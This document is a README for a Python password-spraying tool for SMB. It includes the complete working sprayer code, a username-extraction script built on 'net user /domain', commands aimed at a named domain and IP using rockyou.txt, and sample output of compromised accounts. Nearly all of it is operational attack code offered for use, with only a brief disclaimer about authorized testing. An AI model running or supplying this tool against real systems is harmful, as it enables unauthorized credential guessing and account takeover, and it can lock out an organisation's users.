# SMB-Sprayer

A Python-based multi-threaded SMB Password Spraying tool leveraging Impacket. Supports spraying blank passwords and dictionary attacks against SMBv2/3 enabled systems.

## Features

- Spray blank passwords against a user list.
- Spray a wordlist against a user list.
- Multi-threaded for high-speed attacks.
- Supports SMBv2/3 (Null sessions not required).

## Prerequisites

- Python 3.x
- Install requirements:
  ```bash
  pip install -r requirements.txt
  ```

Create a `requirements.txt` file with the following content:

```text
impacket
```
- Impacket library:
  ```bash
  pip install impacket
  ```

## Extracting Users from Domain Controller

Run the following command on a domain-joined machine to list users:

```cmd
net user /domain
```

This will output usernames in blocks.

### Save Output to a File:

```cmd
net user /domain > domain_users.txt
```

### Convert Extracted Users to Wordlist (Python Script)

```python
# extract_users.py
input_file = 'domain_users.txt'
output_file = 'userlist.txt'

with open(input_file, 'r') as infile:
    lines = infile.readlines()

usernames = []
for line in lines:
    parts = line.strip().split()
    for part in parts:
        if part.isdigit() or part.isalpha() or part.isalnum():
            usernames.append(part)

with open(output_file, 'w') as outfile:
    for user in usernames:
        outfile.write(f"{user}\n")

print(f"[+] Extracted {len(usernames)} usernames to {output_file}")
```

Run:

```bash
python3 extract_users.py
```

## Running SMB-Sprayer

### Blank Password Spray

```bash
python3 smb_sprayer.py --target 10.128.3.1 --domain scasa4.com --userlist userlist.txt --mode blank --threads 30
```

### Wordlist Spray (rockyou.txt)

```bash
python3 smb_sprayer.py --target 10.128.3.1 --domain scasa4.com --userlist userlist.txt --wordlist /usr/share/wordlists/rockyou.txt --mode wordlist --threads 30
```

## smb_sprayer.py (With Parameters)

```python
import threading
import argparse
from impacket.smbconnection import SMBConnection
import time

threads = []

def smb_login(target_ip, domain, user, password):
    try:
        smb = SMBConnection(target_ip, target_ip, sess_port=445, timeout=5)
        smb.login(user, password)
        print(f"[+] SUCCESS: {domain}\\{user} : {password}")
        smb.logoff()
    except Exception as e:
        # pass  # Ignore failed login outputs
        pass  # Ignore failures

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SMB Password Sprayer")
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--domain', required=True, help='Domain name')
    parser.add_argument('--userlist', required=True, help='File with list of usernames')
    parser.add_argument('--wordlist', required=False, help='File with list of passwords')
    parser.add_argument('--threads', type=int, default=20, help='Max concurrent threads')
    parser.add_argument('--mode', choices=['blank', 'wordlist'], required=True, help='Spray mode: blank or wordlist')

    args = parser.parse_args()

    with open(args.userlist, 'r') as f:
        users = [line.strip() for line in f.readlines()]

    if args.mode == 'blank':
        for user in users:
            while threading.active_count() > args.threads:
                time.sleep(0.1)

            t = threading.Thread(target=smb_login, args=(args.target, args.domain, user, ''))
            t.start()
            threads.append(t)

    elif args.mode == 'wordlist':
        if not args.wordlist:
            print("[!] Please provide a wordlist for wordlist mode.")
            exit(1)

        with open(args.wordlist, 'r', encoding="latin-1") as f:
            passwords = [line.strip() for line in f.readlines()]

        for password in passwords:
            for user in users:
                while threading.active_count() > args.threads:
                    time.sleep(0.1)

                t = threading.Thread(target=smb_login, args=(args.target, args.domain, user, password))
                t.start()
                threads.append(t)

    for t in threads:
        t.join()

    print("[*] Password Spray Completed.")
```

## Example Output

```
[+] SUCCESS: scasa4.com\\itadmin : 
[+] SUCCESS: scasa4.com\\guest : 
[+] SUCCESS: scasa4.com\\user : password123
[*] Password Spray Completed.
```

## License

MIT License

## Disclaimer

For educational and authorized penetration testing use only.

